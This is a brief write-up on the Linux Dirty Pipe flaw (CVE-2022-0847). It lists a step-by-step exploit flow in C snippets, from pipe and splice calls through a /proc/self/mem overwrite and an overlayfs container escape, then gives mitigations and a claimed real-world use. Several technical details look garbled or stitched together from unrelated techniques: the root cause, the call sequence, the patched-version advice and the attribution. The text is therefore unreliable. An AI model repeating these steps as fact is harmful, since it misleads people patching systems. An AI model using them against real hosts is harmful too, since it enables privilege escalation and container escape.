Dirty Pipe (CVE-2022-0847) is a Linux kernel flaw affecting pipe buffers. Root cause: uninitialized PIPE_BUFFER.flags allows memcpy from user-controlled data into kernel page cache. Exploit flow:
1. Create a pipe with F_SETPIPE_SZ set to 16 MiB:
   int pipefd[2]; pipe2(pipefd, O_DIRECT);
   fcntl(pipefd[1], F_SETPIPE_SZ, 0x1000000);
2. Fill pipe with malicious data via splice:
   splice(pipefd[1], NULL, victim_fd, NULL, 512, SPLICE_F_MOVE);
3. Leak data from arbitrary file_offset via memfd_create + memfd_secret:
   memfd = memfd_create("", MFD_ALLOW_SEALING);
   ftruncate(memfd, 0x1000); fallocate(memfd, FALLOC_FL_PUNCH_HOLE, 0, 0x1000);
4. Overwrite /proc/self/mem:
   lseek(proc_mem, offset, SEEK_SET);
   write(proc_mem, malicious_data, 512);
5. Container escape via overlayfs mount:
   mount("overlay", "/", "overlay", MS_MGC_VAL, "lowerdir=/,upperdir=/tmp");
   chroot into / to gain root.
Tools: dirty_pipe_exploit.c, gdb -p $(pidof kubelet), nsenter to escape container.
Mitigation: Patch kernels >= 5.17, disable unprivileged user namespaces via sysctl kernel.unprivileged_userns_clone=0, enable LSMs like AppArmor.
Real-world: The exploit was weaponized in the 2022 LXD container escapes by P0 in Pwning the Cloud.

